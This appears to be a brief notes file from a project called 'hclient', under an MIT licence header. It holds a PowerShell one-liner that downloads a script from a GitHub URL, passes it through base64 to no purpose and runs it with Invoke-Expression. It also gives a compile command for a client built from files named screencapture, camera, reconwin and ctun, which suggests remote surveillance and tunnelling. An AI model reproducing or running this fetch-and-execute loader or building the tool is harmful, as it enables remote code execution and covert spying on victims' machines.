/*
Copyright (c) [2024] [F.B (Addict)]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
*/ 

Get-Content lol.ps1 | PowerShell.exe -noprofile -

 $onelineBase64Content = ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Invoke-WebRequest -Uri "https://github.com/addict4ever/SourceTools/raw/main/hclient/lol.ps1").Content))) -replace "`r`n", ""; Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($onelineBase64Content)))

cl /Fe:httptest.exe /I"C:\temp\hclient\include" /std:c++17 /EHsc user32.lib gdi32.lib httptest.cpp screencapture.cpp fileutils.cpp ctun.cpp camera.cpp reconwin.cpp /link /LIBPATH:"C:\temp\hclient\lib" libcurl.lib zlib.lib user32.lib gdi32.lib Ws2_32.lib Crypt32.lib Advapi32.lib ole32.lib strmiids.lib oleaut32.lib Netapi32.lib
